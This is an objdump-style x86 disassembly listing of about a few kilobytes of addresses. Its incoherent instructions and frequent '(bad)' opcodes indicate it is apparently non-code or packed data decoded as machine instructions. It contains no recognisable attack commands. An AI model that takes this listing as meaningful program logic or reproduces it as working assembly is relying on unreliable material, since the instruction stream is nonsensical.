  41e48d:	jmp    0x7d74:0xcb16db7b
  41e494:	sbb    BYTE PTR [edx+0x1132328d],bh
  41e49a:	xchg   edi,eax
  41e49b:	fwait
  41e49c:	test   BYTE PTR [edi+0x66e4d97],bh
  41e4a2:	lods   al,BYTE PTR ds:[esi]
  41e4a3:	pop    es
  41e4a4:	out    dx,al
  41e4a5:	shl    BYTE PTR [edx],0x64
  41e4a8:	push   cs
  41e4a9:	jmp    0x41e485
  41e4ab:	jmp    0x41e462
  41e4ad:	jecxz  0x41e502
  41e4af:	retf   
  41e4b0:	sub    ah,BYTE PTR [ecx+0x52]
  41e4b3:	hlt    
  41e4b4:	rcl    BYTE PTR [edi+0x23],cl
  41e4b7:	dec    esp
  41e4b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4b9:	(bad)  
  41e4ba:	push   ss
  41e4bb:	es in  al,0xc7
  41e4be:	sbb    al,0x1a
  41e4c0:	jg     0x41e4ba
  41e4c2:	mov    eax,ds:0x29c3d9a9
  41e4c7:	mov    esi,0xa8a15543
  41e4cc:	sub    edx,ecx
  41e4ce:	popa   
  41e4cf:	jg     0x41e535
  41e4d1:	pop    edx
  41e4d2:	inc    edi
  41e4d3:	add    bh,BYTE PTR ds:0xfad967b9
  41e4d9:	fs add eax,0xd47a2d25
  41e4df:	add    al,0xa0
  41e4e1:	ja     0x41e527
  41e4e3:	loope  0x41e523
  41e4e5:	push   eax
  41e4e6:	sub    DWORD PTR [edx+0x5e088dd],esi
  41e4ec:	gs dec eax
  41e4ee:	pop    edx
  41e4ef:	jb     0x41e486
  41e4f1:	je     0x41e521
  41e4f3:	jae    0x41e4dd
  41e4f5:	and    ah,BYTE PTR [ebp-0x1b]
  41e4f8:	(bad)  
  41e4f9:	push   ebp
  41e4fa:	inc    eax
  41e4fb:	xchg   esp,eax
  41e4fc:	mov    ds:0xea16b910,eax
  41e501:	sub    esp,DWORD PTR [edx-0x47]
  41e504:	mov    edi,0xf231a61d
  41e509:	fld    DWORD PTR [edx]
  41e50b:	push   esp
  41e50c:	xor    eax,0xda35f6d7
  41e511:	adc    bh,dl
  41e513:	in     eax,dx
  41e514:	(bad)  
  41e515:	fild   WORD PTR [ebp+0x3e]
  41e518:	xchg   esi,eax
  41e519:	and    al,0xd
  41e51b:	pop    ebp
  41e51c:	xor    al,0x80
  41e51e:	add    DWORD PTR [edx],esi
  41e520:	inc    esi
  41e521:	int3   
  41e522:	cdq    
  41e523:	xor    al,0x15
  41e525:	stc    
  41e526:	push   ebx
  41e527:	fs (bad) 
  41e52a:	stc    
  41e52b:	xlat   BYTE PTR ds:[ebx]
  41e52c:	add    BYTE PTR [ebx-0x2bb46afb],ch
  41e532:	cwde   
  41e533:	cli    
  41e534:	dec    ecx
  41e535:	test   BYTE PTR [edx+0x54f48bc3],ch
  41e53b:	test   BYTE PTR [esp+ebx*8+0x9b4454],dh
	...
  41e5b2:	add    BYTE PTR [eax],al
  41e5b4:	jl     0x41e54f
  41e5b6:	dec    esp
  41e5b7:	jbe    0x41e5a6
  41e5b9:	idiv   DWORD PTR [esi-0x65]
  41e5bc:	ss adc al,0xc3
  41e5bf:	repz fidiv WORD PTR [esi-0x6e]
  41e5c3:	pop    ds
  41e5c4:	xor    eax,0xf5000146
  41e5c9:	add    BYTE PTR [eax],al
  41e5cb:	add    BYTE PTR [ecx],ch
  41e5cd:	outs   dx,DWORD PTR ds:[esi]
  41e5ce:	pop    eax
  41e5cf:	dec    esi
  41e5d0:	ror    BYTE PTR [esi],1
  41e5d2:	cwde   
  41e5d3:	push   0x8fe8f544
  41e5d8:	pop    es
  41e5d9:	rcr    DWORD PTR [eax-0x59711a1d],0x92
  41e5e0:	xor    DWORD PTR [eax+0x7e],edi
  41e5e3:	mov    esi,ebx
  41e5e5:	and    ah,BYTE PTR [ecx+0x2139b648]
  41e5eb:	jge    0x41e5fd
  41e5ed:	mov    bh,0x53
  41e5ef:	inc    eax
  41e5f0:	xor    cl,BYTE PTR [ecx+eax*2+0x10ecd681]
  41e5f7:	adc    cl,BYTE PTR [ebx-0x4f33f641]
  41e5fd:	ret    
  41e5fe:	pop    edi
  41e5ff:	inc    ecx
  41e600:	ja     0x41e5cf
  41e602:	cdq    
  41e603:	mov    esp,0xc2d03719
  41e608:	pop    edx
  41e609:	jg     0x41e5a2
  41e60b:	sbb    eax,0xa42aeb03
  41e610:	inc    esi
  41e611:	push   0x3df8d00d
  41e616:	imul   eax,esi,0xffffffe3
  41e619:	dec    eax
  41e61a:	repz jne 0x41e601
  41e61d:	jmp    0xbac1:0xe1682539
  41e624:	sbb    BYTE PTR [ecx+0x3d],dl
  41e627:	jo     0x41e5f3
  41e629:	ss out dx,al
  41e62b:	lods   al,BYTE PTR ds:[esi]
  41e62c:	and    edx,DWORD PTR [ecx-0x19dc4b95]
  41e632:	push   edi
  41e633:	in     al,0x2e
  41e635:	mov    cl,0x14
  41e637:	pop    bx
  41e639:	cmp    dl,BYTE PTR [edi-0x60]
  41e63c:	in     eax,dx
  41e63d:	xchg   edi,eax
  41e63e:	loop   0x41e5df
  41e640:	(bad)  
  41e641:	loopne 0x41e5df
  41e643:	xlat   BYTE PTR ds:[ebx]
  41e644:	into   
  41e645:	retf   
  41e646:	and    DWORD PTR [esi],esi
  41e648:	hlt    
  41e649:	push   edx
  41e64a:	sar    BYTE PTR ds:0xe467735f,cl
  41e650:	cmp    al,0x86
  41e652:	add    bl,BYTE PTR [edx-0x66ef4ccd]
  41e658:	popf   
  41e659:	aam    0xf
  41e65b:	repz pop eax
  41e65d:	and    edi,DWORD PTR [ecx+0x7221f506]
  41e663:	or     bl,BYTE PTR [edi+0x8ea8d4d]
  41e669:	cmp    al,0xc8
  41e66b:	or     DWORD PTR [esi+0x269416f1],0x7110a16f
  41e675:	cmp    eax,0x2f2dcb81
  41e67a:	lds    edx,FWORD PTR [ebx+0x317ba0d8]
  41e680:	or     eax,0x3af5f02f
  41e685:	stos   BYTE PTR es:[edi],al
  41e686:	int3   
  41e687:	mov    ds:0x79a45753,al
  41e68c:	pushf  
  41e68d:	lahf   
  41e68e:	mov    esi,0x3ddf9af5
  41e693:	jp     0x41e681
  41e695:	xchg   ebp,eax
  41e696:	mov    ah,0xeb
  41e698:	jnp    0x41e671
  41e69a:	xor    al,0x5b
  41e69c:	xor    DWORD PTR [esi-0x41],esp
  41e69f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6a0:	(bad)  
  41e6a1:	jecxz  0x41e644
  41e6a3:	or     ch,0x6
  41e6a6:	jp     0x41e6d0
  41e6a8:	mov    edi,0xb28d0ae0
  41e6ad:	mov    esi,0xd2ef4f43
  41e6b2:	repz push 0x6e
  41e6b5:	leave  
  41e6b6:	jecxz  0x41e66e
  41e6b8:	pop    edi
  41e6b9:	xor    ecx,DWORD PTR [esi-0x7377a039]
  41e6bf:	iret   
  41e6c0:	cmp    BYTE PTR [eax],al
	...
  41e732:	add    BYTE PTR [eax],al
  41e734:	and    al,0xce
  41e736:	outs   dx,BYTE PTR ds:[esi]
  41e737:	sub    ch,dh
  41e739:	stos   BYTE PTR es:[edi],al
  41e73a:	fs into 
  41e73c:	cmp    al,0xb2
  41e73e:	xor    ebp,DWORD PTR [ebx+0x30a11e3f]
  41e744:	sub    al,BYTE PTR [edi+0x1]
  41e747:	add    ch,dh
  41e749:	add    BYTE PTR [eax],al
  41e74b:	add    BYTE PTR [edi+0x5b88d70],cl
  41e751:	sbb    eax,0xb5b89648
  41e756:	adc    BYTE PTR [edi+0x50],al
  41e759:	jp     0x41e719
  41e75b:	jecxz  0x41e6e9
  41e75d:	jb     0x41e7be
  41e75f:	mov    ds:0xe85a928f,eax
  41e764:	xor    ch,BYTE PTR [edx+eiz*1]
  41e767:	dec    edi
  41e768:	mov    edi,0x4cbb45b6
  41e76d:	adc    eax,0x42c91d86
  41e772:	xchg   edx,eax
  41e773:	jns    0x41e767
  41e775:	(bad)  
  41e776:	inc    edx
  41e777:	push   ss
  41e778:	cwde   
  41e779:	mov    ds:0xa3f11042,eax
  41e77e:	pop    ds
  41e77f:	jmp    0x41e7f4
  41e781:	(bad)  
  41e782:	pop    edi
  41e783:	cmp    BYTE PTR fs:[eax-0x4c1c0130],cl
  41e78a:	loop   0x41e740
  41e78c:	fimul  DWORD PTR [eax+0x53cfac2d]
  41e792:	and    dl,0x96
  41e795:	outs   dx,DWORD PTR ds:[esi]
  41e796:	jmp    0x52a79a4d
  41e79b:	repz add DWORD PTR [ebx+0x76],esp
  41e79f:	push   0x39
  41e7a1:	xchg   ebp,eax
  41e7a2:	popa   
  41e7a3:	jno    0x41e741
  41e7a5:	jns    0x41e77a
  41e7a7:	scas   eax,DWORD PTR es:[edi]
  41e7a8:	jp     0x41e7cd
  41e7aa:	sub    eax,0x6be4cafb
  41e7af:	push   eax
  41e7b0:	jmp    0xedfb5088
  41e7b5:	dec    ebx
  41e7b6:	les    edx,FWORD PTR [edi-0xe]
  41e7b9:	call   0x6a01:0x5e7d101c
  41e7c0:	jno    0x41e76a
  41e7c2:	je     0x41e80a
  41e7c4:	inc    DWORD PTR [eax-0x1f]
  41e7c7:	cwde   
  41e7c8:	out    0xc,eax
  41e7ca:	cli    
  41e7cb:	cli    
  41e7cc:	inc    edi
  41e7cd:	out    dx,eax
  41e7ce:	jp     0x41e80a
  41e7d0:	pushf  
  41e7d1:	fadd   st,st(1)
  41e7d3:	(bad)  
  41e7d4:	sub    DWORD PTR [ecx],ebx
  41e7d6:	jmp    0x41e793
  41e7d8:	pop    eax
  41e7d9:	in     al,0xd9
  41e7db:	lods   eax,DWORD PTR ds:[esi]
  41e7dc:	or     dh,ch
  41e7de:	mov    ds:0xdf404888,eax
  41e7e3:	arpl   ax,di
  41e7e5:	repnz add dl,0xb0
  41e7e9:	sar    BYTE PTR [edi+ebp*1-0x7cfd9668],cl
  41e7f0:	cmp    DWORD PTR [esi-0x6d],0x45
  41e7f4:	in     al,dx
  41e7f5:	imul   esi,edx,0xffffffd1
  41e7f8:	out    dx,al
  41e7f9:	or     BYTE PTR [ebp-0x5cd7d11],0xdf
  41e800:	mov    edx,0xe36f42ab
  41e805:	mov    al,0x29
  41e807:	stos   DWORD PTR es:[edi],eax
  41e808:	ins    DWORD PTR es:[edi],dx
  41e809:	push   es
  41e80a:	mov    DWORD PTR [ebx+edx*4-0x2],esp
  41e80e:	shl    BYTE PTR [ebx],0x8e
  41e811:	jmp    0x1034:0x76eb4d0b
  41e818:	and    DWORD PTR [ebx+0x5c],edi
  41e81b:	fcom   st(2)
  41e81d:	jns    0x41e842
  41e81f:	fcomp  QWORD PTR [edx]
  41e821:	pop    ebx
  41e822:	fisub  WORD PTR [edi+ebx*4+0x17]
  41e826:	adc    ecx,DWORD PTR [ebp-0x62af5562]
  41e82c:	jg     0x41e88a
  41e82e:	mov    eax,0xc2747527
  41e833:	push   ebp
  41e834:	out    0x56,al
  41e836:	(bad)  
  41e837:	and    esi,DWORD PTR cs:[ecx+0x2dfb5c2a]
  41e83e:	mov    dl,0xa3
  41e840:	cld    
	...
  41e8b1:	add    BYTE PTR [eax],al
  41e8b3:	add    ah,al
  41e8b5:	ins    BYTE PTR es:[edi],dx
  41e8b6:	pop    es
  41e8b7:	pushf  
  41e8b8:	scas   eax,DWORD PTR es:[edi]
  41e8b9:	(bad)  
  41e8ba:	fistp  QWORD PTR [esi+eiz*4-0x50]
  41e8be:	loop   0x41e93a
  41e8c0:	mov    ebp,0x1f56c18e
  41e8c5:	dec    eax
  41e8c6:	add    DWORD PTR [eax],eax
  41e8c8:	cmc    
  41e8c9:	add    BYTE PTR [eax],al
  41e8cb:	add    BYTE PTR [ecx-0x337c4802],ah
  41e8d1:	adc    edi,DWORD PTR [ecx]
  41e8d3:	jl     0x41e8b9
  41e8d5:	fld1   
  41e8d7:	mov    edi,0x3f8f8700
  41e8dc:	nop
  41e8dd:	lahf   
  41e8de:	mov    eax,ds:0xdaadd6f0
  41e8e3:	test   al,0x0
  41e8e5:	ret    
  41e8e6:	add    eax,0x645da8f7
  41e8eb:	out    0xb6,al
  41e8ed:	ja     0x41e911
  41e8ef:	mov    al,0xbd
  41e8f1:	mov    esp,0xfa7b5bdf
  41e8f6:	es jo  0x41e93f
  41e8f9:	sub    esp,esp
  41e8fb:	or     eax,0x5aeeced4
  41e900:	lods   al,BYTE PTR ds:[esi]
  41e901:	aad    0xc2
  41e903:	js     0x41e966
  41e905:	por    mm2,QWORD PTR [eax-0x633d6f9a]
  41e90c:	es and al,0x85
  41e90f:	sub    DWORD PTR [ebx],eax
  41e911:	adc    al,0xbb
  41e913:	xor    DWORD PTR [esi],edi
  41e915:	fisttp WORD PTR [ebp-0x50a72513]
  41e91b:	outs   dx,BYTE PTR ds:[esi]
  41e91c:	daa    
  41e91d:	mov    ch,0xfb
  41e91f:	jno    0x41e8c4
  41e921:	mov    ds:0x2855fa87,eax
  41e926:	in     eax,dx
  41e927:	ror    DWORD PTR [ebp+0x64],cl
  41e92a:	stos   BYTE PTR es:[edi],al
  41e92b:	lahf   
  41e92c:	ja     0x41e939
  41e92e:	inc    ebx
  41e92f:	sbb    BYTE PTR [ebp+0x78],dl
  41e932:	mov    dh,0x2f
  41e934:	cmp    edi,edx
  41e936:	sar    ebx,cl
  41e938:	and    al,0x5b
  41e93a:	and    dh,0x99
  41e93d:	nop
  41e93e:	pop    edi
  41e93f:	dec    esp
  41e940:	mov    edx,0x514af11d
  41e945:	mov    dh,ch
  41e947:	add    dh,bl
  41e949:	mov    bl,0x23
  41e94b:	sub    esi,edi
  41e94d:	loope  0x41e937
  41e94f:	mov    esi,0x97f64f83
  41e954:	jae    0x41e933
  41e956:	sub    BYTE PTR [edx+0x3e0e0e69],cl
  41e95c:	or     al,BYTE PTR [eax+0xe4131ca]
  41e962:	sti    
  41e963:	inc    ecx
  41e964:	inc    ecx
  41e965:	ficomp DWORD PTR [edi]
  41e967:	ds inc esp
  41e969:	mov    edi,0x5b810a5b
  41e96e:	sub    al,0x46
  41e970:	je     0x41e8fb
  41e972:	adc    ebx,edx
  41e974:	cld    
  41e975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e976:	dec    esp
  41e977:	ret    
  41e978:	mov    esp,0xe2e7d2cf
  41e97d:	das    
  41e97e:	pop    esp
  41e97f:	dec    eax
  41e980:	add    DWORD PTR [ebx-0x17ce3d65],ebx
  41e986:	mov    ds,WORD PTR ds:0xb03adb66
  41e98c:	rol    BYTE PTR ss:[edx+edi*2],1
  41e990:	dec    ecx
  41e991:	cs jmp 0x41e95f
  41e994:	test   DWORD PTR [eax+eax*1+0x6e],ebx
  41e998:	adc    DWORD PTR ss:[eax+0x48],edx
  41e99c:	sub    eax,0x79603621
  41e9a1:	sbb    edx,DWORD PTR [ecx+0x4d07f239]
  41e9a7:	push   ebx
  41e9a8:	push   esp
  41e9a9:	je     0x41e9b0
  41e9ab:	icebp  
  41e9ac:	mov    al,0x68
  41e9ae:	push   eax
  41e9af:	jecxz  0x41e988
  41e9b1:	dec    esi
  41e9b2:	mov    WORD PTR [esi-0x7d],cs
  41e9b5:	cmc    
  41e9b6:	stos   DWORD PTR es:[edi],eax
  41e9b7:	icebp  
  41e9b8:	add    BYTE PTR ds:0x832a15c3,bh
  41e9be:	inc    esp
  41e9bf:	pop    ds
  41e9c0:	mov    ecx,0x0
	...
  41ea31:	add    BYTE PTR [eax],al
  41ea33:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41ea3a:	cmp    al,0x5f
  41ea3c:	les    ecx,FWORD PTR [ebx+0x21]
  41ea3f:	fnstsw WORD PTR [esi-0x42]
  41ea42:	ret    0x143b
  41ea45:	dec    ecx
  41ea46:	add    DWORD PTR [eax],eax
  41ea48:	cmc    
  41ea49:	add    BYTE PTR [eax],al
  41ea4b:	add    BYTE PTR [ecx-0x44c78a0f],dh
  41ea51:	inc    edi
  41ea52:	ds cmp ebx,esp
  41ea55:	fidivr DWORD PTR [ebx+edi*1+0x5c5e11b4]
  41ea5c:	cmp    DWORD PTR [ecx-0x74],0xffffffb9
  41ea60:	neg    BYTE PTR [edi]
  41ea62:	sbb    ecx,esi
  41ea64:	test   BYTE PTR [ebx-0x1a],cl
  41ea67:	mov    ch,BYTE PTR [ecx]
  41ea69:	pop    eax
  41ea6a:	sub    al,0x58
  41ea6c:	int3   
  41ea6d:	aas    
  41ea6e:	aad    0x4b
  41ea70:	sbb    dh,BYTE PTR [ebp+0x27d4f1b3]
  41ea76:	lods   eax,DWORD PTR ds:[esi]
  41ea77:	repz xor ah,BYTE PTR [ebx-0x6543a230]
  41ea7e:	ret    0xe474
  41ea81:	push   edx
  41ea82:	push   0x76edde96
  41ea87:	jp     0x41ea99
  41ea89:	(bad)  
  41ea8a:	jecxz  0x41eaca
  41ea8c:	sub    eax,0x159956f6
  41ea91:	bound  ecx,QWORD PTR [eax]
  41ea93:	or     al,0x1d
  41ea95:	cdq    
  41ea96:	jle    0x41eaa9
  41ea98:	out    0xfb,eax
  41ea9a:	mov    eax,ds:0xed8029e6
  41ea9f:	test   eax,0x5b08f354
  41eaa4:	aas    
  41eaa5:	ss icebp 
  41eaa7:	mov    BYTE PTR [edx],dh
  41eaa9:	arpl   WORD PTR [ebx],dx
  41eaab:	arpl   WORD PTR [ecx],bx
  41eaad:	shl    DWORD PTR ds:0x53c0fe77,0x81
  41eab4:	and    dl,al
  41eab6:	popw   ss
  41eab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eab9:	in     ax,dx
  41eabb:	jns    0x41eafa
  41eabd:	jns    0x41ea4d
  41eabf:	xchg   DWORD PTR [ebp-0x50a32122],edi
  41eac5:	or     eax,0x6ff6e880
  41eaca:	vcmpsd xmm7,xmm2,QWORD PTR [edi+0x18461094],0xc8
  41ead3:	add    eax,0x63a06ad5
  41ead8:	enter  0x223d,0x59
  41eadc:	loop   0x41eac0
  41eade:	push   edi
  41eadf:	xor    bh,cl
  41eae1:	stc    
  41eae2:	jle    0x41eb2a
  41eae4:	lds    ebx,FWORD PTR [edx]
  41eae6:	iret   
  41eae7:	out    0x1b,al
  41eae9:	lock (bad) [ebx]
  41eaec:	cwde   
  41eaed:	mov    esi,0x2cacb211
  41eaf2:	mov    al,BYTE PTR [ecx]
  41eaf4:	inc    ebp
  41eaf5:	jmp    0x9cdbd0d7
  41eafa:	sub    ch,BYTE PTR [ecx+0x359f5546]
  41eb00:	sar    DWORD PTR [edx+0x17],cl
  41eb03:	xor    eax,0x11057ca9
  41eb08:	pushf  
  41eb09:	or     cl,BYTE PTR [edx]
  41eb0b:	aaa    
  41eb0c:	aaa    
  41eb0d:	add    DWORD PTR ds:[edx+0xb],eax
  41eb11:	pop    esi
  41eb12:	jb     0x41eb91
  41eb14:	add    al,0x3a
  41eb16:	ja     0x41eb23
  41eb18:	mov    cl,bh
  41eb1a:	xchg   esi,eax
  41eb1b:	hlt    
  41eb1c:	imul   edx,ebx,0x980e67b6
  41eb22:	jae    0x41eb1e
  41eb24:	mov    ebp,0x458ce2c8
  41eb29:	loopne 0x41ead0
  41eb2b:	addr16 jge 0x41eb11
  41eb2e:	xchg   esp,eax
  41eb2f:	(bad)  
  41eb30:	jbe    0x41eac3
  41eb32:	fdiv   DWORD PTR [eax]
  41eb34:	cmp    al,0xc5
  41eb36:	out    0x5e,eax
  41eb38:	sbb    eax,0x2f136d1
  41eb3d:	push   cs
  41eb3e:	lods   al,BYTE PTR ds:[esi]
  41eb3f:	mov    edi,0x6f
	...
  41ebb4:	outs   dx,DWORD PTR ds:[esi]
  41ebb5:	retf   0x9815
  41ebb8:	mov    ch,0xdf
  41ebba:	out    dx,eax
  41ebbb:	inc    DWORD PTR [ebx+0x1e]
  41ebbe:	arpl   sp,si
  41ebc0:	jnp    0x41eb61
  41ebc2:	pop    ecx
  41ebc3:	or     BYTE PTR [ecx],0x4a
  41ebc6:	add    DWORD PTR [eax],eax
  41ebc8:	cmc    
  41ebc9:	add    BYTE PTR [eax],al
  41ebcb:	add    BYTE PTR [edx-0x36b594ce],ch
  41ebd1:	xchg   ebp,eax
  41ebd2:	mov    cl,0xac
  41ebd4:	(bad)  
  41ebd5:	push   ecx
  41ebd6:	popf   
  41ebd7:	mov    dl,0x13
  41ebd9:	(bad)  [esi-0x33]
  41ebdc:	pop    esi
  41ebdd:	xchg   ebp,eax
  41ebde:	dec    ebx
  41ebdf:	shr    DWORD PTR cs:[ebx],1
  41ebe2:	(bad)  
  41ebe4:	(bad)  
  41ebe5:	rcl    BYTE PTR [edi+0xc],1
  41ebe8:	add    eax,0x4ba71590
  41ebed:	(bad)  
  41ebee:	and    edx,DWORD PTR [ebx-0x149bdde]
  41ebf4:	xchg   BYTE PTR [ecx-0x42],al
  41ebf7:	(bad)  
  41ebf8:	mov    eax,ds:0xb8db52c4
  41ebfd:	pop    esi
  41ebfe:	add    ebp,DWORD PTR [ebx+0x524b2b2b]
  41ec04:	and    al,0x46
  41ec06:	xchg   esp,eax
  41ec07:	ins    BYTE PTR es:[edi],dx
  41ec08:	cmp    ecx,edi
  41ec0a:	or     eax,0x4009916b
  41ec0f:	sub    edx,DWORD PTR ds:0xf61ebd9a
  41ec15:	(bad)  
  41ec16:	hlt    
  41ec17:	loopne 0x41ec4a
  41ec19:	mov    ds:0xfa655460,al
  41ec1e:	dec    eax
  41ec1f:	int3   
  41ec20:	or     DWORD PTR [ebx+eiz*2-0x7541cfb1],ebx
  41ec27:	pop    ebp
  41ec28:	push   0x5a4b9c7
  41ec2d:	or     esi,0xffffffab
  41ec30:	xor    ch,BYTE PTR [edi-0x52292fb]
  41ec36:	outs   dx,BYTE PTR ds:[esi]
  41ec37:	mov    ds:0x57551cac,eax
  41ec3c:	xor    DWORD PTR [ecx-0x6b9c6f4d],edx
  41ec42:	jmp    0x7e8a6a34
  41ec47:	in     eax,0xf1
  41ec49:	fistp  WORD PTR [ebx+0x4c5bd70]
  41ec4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec50:	or     BYTE PTR [eax+0x52c076c7],0xd4
  41ec57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec58:	add    BYTE PTR [ebx],al
  41ec5a:	daa    
  41ec5b:	test   eax,ebp
  41ec5d:	xor    edi,esi
  41ec5f:	xlat   BYTE PTR ds:[ebx]
  41ec60:	inc    esp
  41ec61:	sbb    DWORD PTR [ebp+0x5e],ebp
  41ec64:	icebp  
  41ec65:	retf   
  41ec66:	(bad)  
  41ec67:	scas   al,BYTE PTR es:[edi]
  41ec68:	or     al,0xaf
  41ec6a:	add    eax,ebp
  41ec6c:	adc    BYTE PTR fs:[edi+0x167bafa0],bh
  41ec73:	cli    
  41ec74:	xor    DWORD PTR [ebx+0x64f7c424],ecx
  41ec7a:	rcr    eax,0x71
  41ec7d:	movq   QWORD PTR [edx],mm4
  41ec80:	inc    esp
  41ec81:	fmul   DWORD PTR [ecx-0x37c7281c]
  41ec87:	mov    ch,0x95
  41ec89:	sti    
  41ec8a:	dec    eax
  41ec8b:	mov    BYTE PTR [esi+0x51],ah
  41ec8e:	mov    bl,0x81
  41ec90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec91:	cmp    al,0x9d
  41ec93:	aad    0xb8
  41ec95:	retf   0x5ed0
  41ec98:	mov    esp,0x830408dc
  41ec9d:	adc    cl,BYTE PTR [ecx]
  41ec9f:	sbb    BYTE PTR [ecx],ah
  41eca1:	mov    ds:0x90050742,al
  41eca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eca7:	outs   dx,BYTE PTR ds:[esi]
  41eca8:	mov    al,ds:0x8c6052cf
  41ecad:	sbb    ah,ah
  41ecaf:	and    DWORD PTR [eax],eax
  41ecb1:	or     al,0x66
  41ecb3:	rol    BYTE PTR [edx+0x6af801b0],1
  41ecb9:	adc    BYTE PTR [eax-0x4],dl
  41ecbc:	ret    
  41ecbd:	xor    ebp,edx
  41ecbf:	(bad)  
  41ecc0:	xchg   edx,eax
	...
  41ed31:	add    BYTE PTR [eax],al
  41ed33:	add    BYTE PTR [eax],ah
  41ed35:	repz das 
  41ed37:	cmp    bh,0xde
  41ed3a:	lods   eax,DWORD PTR ds:[esi]
  41ed3b:	repz xlat BYTE PTR ds:[ebx]
  41ed3d:	in     al,dx
  41ed3e:	pusha  
  41ed3f:	out    dx,al
  41ed40:	shl    BYTE PTR [bp+si+0x65],1
  41ed44:	dec    BYTE PTR [edx+0x1]
  41ed47:	add    ch,dh
  41ed49:	add    BYTE PTR [eax],al
  41ed4b:	add    BYTE PTR [ecx+ebp*1-0x547f00a4],dl
  41ed52:	sub    al,0x72
  41ed54:	loope  0x41ed46
  41ed56:	inc    eax
  41ed57:	mov    ebp,0x4b6e4858
  41ed5c:	gs in  al,0xc5
  41ed5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed60:	mov    ds:0x113eafd7,al
  41ed65:	loope  0x41ed2f
  41ed67:	pop    esi
  41ed68:	mov    eax,0x13ade6c1
  41ed6d:	adc    BYTE PTR [ecx+0x308d0535],al
  41ed73:	or     edx,DWORD PTR [edx-0x6a]
  41ed76:	and    bh,BYTE PTR [edx]
  41ed78:	aaa    
  41ed79:	or     esp,DWORD PTR [eax]
  41ed7b:	lock ror BYTE PTR ds:[edi-0x73],1
  41ed80:	xor    eax,0x203ef11e
  41ed85:	and    DWORD PTR [ecx+0x1e],0x2a
  41ed89:	mov    ebx,0xe6eacdcf
  41ed8e:	jg     0x41edc8
  41ed90:	addr16 dec ecx
  41ed92:	ror    DWORD PTR [edx-0x6d],cl
  41ed95:	inc    esp
  41ed96:	lock lds ecx,FWORD PTR [ebx+0x7c7c1b99]
  41ed9d:	sbb    eax,0x686d086b
  41eda2:	aaa    
  41eda3:	je     0x41ee20
  41eda5:	popf   
  41eda6:	lds    ebx,FWORD PTR ds:0xd27ab933
  41edac:	mov    ebx,0x90ec3222
  41edb1:	mov    ch,0x43
  41edb3:	sbb    eax,0xd62c212f
  41edb8:	pop    edi
  41edb9:	les    ecx,FWORD PTR [ecx]
  41edbb:	sub    esp,DWORD PTR ds:0xf3c9ca00
  41edc1:	fs xchg ebx,eax
  41edc3:	and    eax,DWORD PTR [edx-0x2a3ff3f6]
  41edc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edca:	jo     0x41ed9d
  41edcc:	jne    0x41ee16
  41edce:	call   0x223b:0x66768742
  41edd5:	pop    esp
  41edd6:	add    ah,BYTE PTR [eax]
  41edd8:	int3   
  41edd9:	(bad)  
  41edda:	ficom  WORD PTR [esi]
  41eddc:	(bad)  [ebp+0x58]
  41eddf:	bound  esi,QWORD PTR [ebp+0x594efb97]
  41ede5:	xor    al,ah
  41ede7:	adc    eax,0x193dd24d
  41edec:	xchg   esi,eax
  41eded:	in     eax,0xf8
  41edef:	lock xchg esp,eax
  41edf1:	inc    ebx
  41edf2:	fcomp  QWORD PTR [edx-0x34]
  41edf5:	mov    ch,0x88
  41edf7:	leave  
  41edf8:	push   ecx
  41edf9:	(bad)  
  41edfa:	clc    
  41edfb:	inc    edx
  41edfc:	popf   
  41edfd:	imul   DWORD PTR [ebp-0xf21f40a]
  41ee03:	jno    0x41ede2
  41ee05:	mov    cl,0x3d
  41ee07:	jns    0x41ee30
  41ee09:	je     0x41ee25
  41ee0b:	lock (bad) 
  41ee0d:	addps  xmm2,xmm1
  41ee10:	sub    BYTE PTR [eax+0xd],cl
  41ee13:	adc    ebp,ecx
  41ee15:	dec    edx
  41ee16:	cwde   
  41ee17:	add    al,0x5
  41ee19:	cdq    
  41ee1a:	fs sub dl,dl
  41ee1d:	mov    bh,0x4
  41ee1f:	popa   
  41ee20:	push   ecx
  41ee21:	fild   QWORD PTR [ebp-0x2a]
  41ee24:	xchg   esi,eax
  41ee25:	adc    ebx,edi
  41ee27:	outs   dx,BYTE PTR ds:[esi]
  41ee29:	dec    edx
  41ee2a:	jmp    0x1bc1:0x9988cd9e
  41ee31:	(bad)  [eax]
  41ee33:	or     dh,dl
  41ee35:	push   DWORD PTR [edi]
  41ee37:	test   ch,dl
  41ee39:	jmp    0x9eb09ad8
  41ee3e:	outs   dx,DWORD PTR ds:[esi]
  41ee3f:	sti    
  41ee40:	xchg   BYTE PTR [eax],al
	...
  41eeb2:	add    BYTE PTR [eax],al
  41eeb4:	aas    
  41eeb5:	daa    
  41eeb6:	push   ss
  41eeb7:	cld    
  41eeb8:	push   ds
  41eeb9:	std    
  41eeba:	jmp    edi
  41eebc:	push   eax
  41eebd:	jg     0x41eee4
  41eebf:	push   esp
  41eec0:	dec    esp
  41eec1:	mov    ch,0x5c
  41eec3:	xor    al,0xf3
  41eec5:	dec    ebx
  41eec6:	add    DWORD PTR [eax],eax
  41eec8:	cmc    
  41eec9:	add    BYTE PTR [eax],al
  41eecb:	add    BYTE PTR [esi+0x56],cl
  41eece:	xchg   BYTE PTR [edi+0x12934fc0],bh
  41eed4:	or     al,0xc8
  41eed6:	ret    
  41eed7:	inc    esp
  41eed8:	jp     0x41ef2f
  41eeda:	adc    esp,DWORD PTR [ecx-0x5f1f1ec9]
  41eee0:	sbb    al,0x2f
  41eee2:	rol    ecx,0xb7
  41eee5:	mov    BYTE PTR [esi-0xb],bl
  41eee8:	adc    al,0xb7
  41eeea:	jb     0x41eeba
  41eeec:	inc    ecx
  41eeed:	stc    
  41eeee:	shr    BYTE PTR [ecx],0xed
  41eef1:	sub    DWORD PTR fs:[eax+0x3762be67],edx
  41eef8:	sub    DWORD PTR [eax-0x7d],esi
  41eefb:	push   ds
  41eefc:	dec    ecx
  41eefd:	xor    bl,ah
